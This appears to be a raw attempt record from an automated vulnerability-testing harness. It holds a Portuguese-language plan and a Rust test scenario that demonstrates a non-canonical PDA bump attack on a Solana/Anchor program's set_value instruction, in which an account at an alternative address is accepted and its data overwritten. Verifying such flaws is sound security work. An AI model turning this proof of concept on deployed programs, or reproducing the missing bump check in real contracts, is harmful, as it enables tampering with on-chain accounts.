attempts.raw:
{
  "plan": "Preparamos uma conta DataAccount no PDA canonico derivado de [b"data", user] com bump canonico, e um usuario signer. O baseline chama set_value com o bump canonico e um valor legitimo, provando que o cenario esta correto. O ataque chama set_value com um bump nao-canonico (menor que o canonico) que ainda produz um PDA valido, passando uma conta DataAccount nesse endereco alternativo. O efeito medido e que a conta no endereco nao-canonico foi aceita e teve seus dados sobrescritos (user e value alterados), enquanto o PDA canonico permanece intacto.",
  "scenario": "let user = Pubkey::new_unique();
let (canonical_pda, canonical_bump) = Pubkey::find_program_address(&[b"data", user.as_ref()], &env.program_id);

// Encontra um bump nao-canonico que ainda produz um PDA valido
let mut non_canonical_bump = canonical_bump - 1;
let mut non_canonical_pda = Pubkey::create_program_address(&[b"data", user.as_ref(), &[non_canonical_bump]], &env.program_id);
while non_canonical_pda.is_err() && non_canonical_bump > 0 {
    non_canonical_bump -= 1;
    non_canonical_pda = Pubkey::create_program_address(&[b"data", user.as_ref(), &[non_canonical_bump]], &env.program_id);
}
let non_canonical_pda = non_canonical_pda.unwrap();

// Conta DataAccount no PDA canonico (estado inicial)
let canonical_data = anchor_account_data("DataAccount", &(user, 0u64, canonical_bump));
let canonical_account = account(&env.program_id, &canonical_data, None);

// Conta DataAccount no PDA nao-canonico (alvo do ataque)
let non_canonical_data = anchor_account_data("DataAccount", &(Pubkey::new_unique(), 0u64, non_canonical_bump));
let non_canonical_account = account(&env.program_id, &non_canonical_data, None);

let user_account = wallet(1_000_000_000);

// Baseline: uso legitimo com bump canonico
let baseline_ix = env.anchor_ix(
    "set_value",
    &(canonical_bump, 42u64),
    vec![
        AccountMeta::new(canonical_pda, false),
        AccountMeta::new_readonly(user, true),
    ],
);
let baseline_accounts = vec![
    (canonical_pda, canonical_account.clone()),
    (user, user_account.clone()),
];
let baseline_result = env.baseline("set_value legitimo com bump canonico", &baseline_ix, &baseline_accounts);

// Ataque: bump nao-canonico e conta no PDA alternativo
let attack_ix = env.anchor_ix(
    "set_value",
    &(non_canonical_bump, 999u64),
    vec![
        AccountMeta::new(non_canonical_pda, false),
        AccountMeta::new_readonly(user, true),
    ],
);
let attack_accounts = vec![
    (non_canonical_pda, non_canonical_account),
    (user, user_account),
];
let attack_result = env.attack("set_value com bump nao-canonico", &attack_ix, &attack_accounts);

if attack_result.program_result == ProgramResult::Success {
    let data = after(&attack_result, &non_canonical_pda).data();
    let stored_user = read_pubkey(data, 8);
    let stored_value = read_u64(data, 40);
    let stored_bump = data[48];
    env.effect(
        "conta no PDA nao-canonico foi aceita e sobrescrita",
        stored_user == user && stored_value == 999u64 && stored_bump == non_canonical_bump,
    );
}"
}

